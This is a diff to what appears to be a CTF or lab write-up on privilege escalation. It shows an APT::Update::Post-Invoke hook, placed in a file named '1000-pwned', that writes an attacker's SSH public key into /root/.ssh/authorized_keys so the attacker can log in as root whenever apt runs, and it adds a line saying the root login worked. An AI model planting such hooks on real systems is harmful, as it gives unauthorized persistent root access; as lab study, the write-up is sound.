@@ -33,4 +33,5 @@ So using this method we can make file called `1000-pwned` and add
 ```
 APT::Update::Post-Invoke {"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/mwm452HoYqTenuKZfoWk/GzXPOU7PHemPETWNWQw8mSBcy52PYGqqMYJ+L0Rj3F1xO/iVDw8w0kd6fcROiY6A2YpWAN/lqiUDlR/w3WREZj27Bp8G+FIm9fqNJqIV7y+gSpZUkgohqvb+z0iSWTT2k8bw9Ey7xKM35UMequdEUIyQpVG8/U75heBKkgk78k0inGBQ22ZBNcEsl0+CsCmtqJR3tkkcCLWaPnpsh5VWalwG3qMfU0b0fweTUC+yWr0PPad0mIc0qXsflSw6pD6WWDKnv0aLLToFMkTQymta5dV2kRbWQILlaWoNjuKd/btzek+VF53r/y1pZvkqlD/CJFtaWRtJ4ftVX1RFo8d1iSjMNEqpSt4hhhsJllLU2vivCBI+qpv6ziviLKBzUCSr+s5DAJ6Gcw7CUFy167utJHhx0AN1ePTq/szTNH2QdZ0qrZixx6KIBKWpoqaBSu9x5sw28J0ciEOuB8dU/YjGdk2cF+BxiJcCjAyaAztTVk= kali@kali' > /root/.ssh/authorized_keys";};
 ```
-SO that when apt is run , kali vm public key is copied to /root/.ssh/authorized_keys and we can ssh login as root.
+So that when apt is run , kali vm public key is copied to /root/.ssh/authorized_keys and we can ssh login as root like below we ssh logged in as root.
+![[Pasted image 20211004135338.png]]
